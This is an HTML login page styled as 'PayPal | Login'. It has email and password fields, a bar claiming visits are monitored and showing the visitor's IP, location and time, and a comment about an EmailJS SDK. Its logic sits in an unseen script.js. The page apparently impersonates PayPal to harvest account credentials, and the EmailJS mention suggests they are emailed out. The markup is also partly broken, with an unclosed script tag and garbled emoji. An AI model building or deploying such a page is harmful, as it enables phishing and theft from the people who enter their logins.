<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>PayPal | Login</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <!-- Security notice bar -->
  <div class="security-bar">
    <div class="security-text">
      üõ°Ô∏è Activities on this website are being monitored for security purposes.
    </div>

    <div class="user-info">
      <span id="user-ip">IP:</span>
      <span id="user-location">Location:</span>
      <span id="user-time">Time:</span>
    </div>
  </div>
  
  <div class="auth-page">
    <div class="login-container">
      <h2>PayPal</h2>
      <input type="email" id="email" placeholder="Email">
      <input type="password" id="password" placeholder="Password">
      <!-- Forgot email link -->
      <a href="forgot-email.html" class="forgot-email">Forgot Email?</a>
      
      <button id="loginBtn">Log In</button>
      
    </div>
  </div>

  <!-- ‚úÖ Optional EmailJS SDK -->

  <script>

  <!-- ‚úÖ Your main app logic -->
  <script src="script.js"></script>

</html>
